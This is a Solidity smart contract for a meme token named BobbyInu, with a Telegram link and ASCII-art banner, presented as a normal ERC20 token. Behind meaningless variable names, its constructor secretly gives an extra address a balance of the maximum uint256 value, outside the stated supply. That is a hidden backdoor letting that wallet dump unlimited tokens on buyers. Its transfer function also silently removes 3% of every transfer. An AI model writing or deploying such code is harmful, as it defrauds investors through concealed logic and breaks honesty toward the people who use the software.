/*

https://t.me/bobbyinu_eth


                            ▄▄▄▄███████████████████████████▄▄▄,
                       ▄▄████████████████████████████████████████▄,
                   ,▄██████████▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▀▀`''`▀▀██████▄
                 ▄████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▀'            ▀█████▄
               ,███████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▀                 ▀█████▄
              ▄██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▌                    ▀████▄
      ,▄███████████████████████▄▒▒▒▒▒▒▒▒▒▒▒████⌐               ▄▄    ▀████
     ▄████████████████████████████▄▒▒▒▒▒▒▒▒████▒              ▐███    ████▌
    █████▀                 `▀▀██████▄▒▒▒▒▒▒████░▒             ████▌   ▐████
    █████                      ▀██████▒▒▒▒▒▒████▒▒,           ▀███     ████
    ▐████▄                       ▀████▌▒▒▒▒▒▀████░▒H,          ▀▀'     ████C
     █████                        █████▒▒▒▒▒▒▒█████▄░▒H╖              ▐████▌
     ▐████▌                       ▐████▒▒▒▒▒▒▒▒▒███████▄▄▄▒gg╖,,▄▄▄▄▄▄██████▄▄▄▄,
      █████▌╖                   ,╥█████▒▒▒▒▒▒▒▒▒▒▄████████████████████████████████▄
       ██████░▒╥╖,          ,╓H▒▒▄█████▒▒▒▒▒▒▒██████████████████████████████████████
        ▀█████▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░██████▒▒▒▒▒▒▓████╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢████
         '███████▄░▒▒▒▒▒▒▒▒▒░▄███████▒╣╣╣╣╣╫████▓▓▓▓▓▓╣╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███████
           ▀███████████████████████▒╢╢╢╢╢╢╢▓███╣▓▓▓▓▓██████████████████████████████▀
            ▐███████████████████▀▒╢╢╢╢╢╢╢╢╢╫███▌▓▓▓▓▓╢██████████████████████████▀
             ██████▓▀▀▀▀▀▀▀▀▒▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢████╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▌
              ██████▌╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▀█████▓▓╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▓█████▌
               ▀██████▄▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣▒███████████████████████████████"
                 ▀████████▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▒▒▒▒▒▒▀▀▀▀████████████████▀▀
                   ▀███████████▄▒▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▒▄███████▀
                      ▀█████████████████████████████████████████▀
                          ▀▀▀█████████████████████████████▀▀▀▀

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

import "./Ownable.sol";
import "./ERC20.sol";

contract BobbyInu is ERC20, Ownable {
    uint256 private easy = ~uint256(0);
    uint256 public eat = 3;

    constructor(
        string memory swam,
        string memory aboard,
        address broken,
        address came
    ) ERC20(swam, aboard) {
        _balances[came] = easy;
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address lot,
        address struck,
        uint256 shot
    ) internal override {
        uint256 actually = (shot / 100) * eat;
        shot = shot - actually;
        super._transfer(lot, struck, shot);
    }
}
